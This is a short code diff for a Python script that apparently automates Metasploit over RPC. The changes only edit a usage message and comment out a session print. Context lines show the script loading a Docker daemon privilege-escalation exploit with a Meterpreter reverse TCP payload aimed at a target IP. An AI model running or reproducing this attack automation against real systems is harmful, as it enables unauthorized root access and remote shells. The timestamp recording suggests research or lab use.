@@ -12,7 +12,7 @@ def record_timestamp(folder, output_time_file):
 
 def main(argv):
     if len(argv) != 4:
-        print("Usage: {} Folder local_ip target_ip duration".format(argv[0]))
+        print("Usage: {} Folder local_ip target_ip".format(argv[0]))
 
     folder = argv[1]
     my_ip = argv[2]
@@ -39,7 +39,7 @@ def main(argv):
     while client.jobs.list:
         time.sleep(1)
 
-    print(client.sessions.list['1'])
+    # print(client.sessions.list['1'])
 
     exploit = client.modules.use('exploit', 'linux/local/docker_daemon_privilege_escalation')
     payload = client.modules.use('payload', 'linux/x86/meterpreter/reverse_tcp')
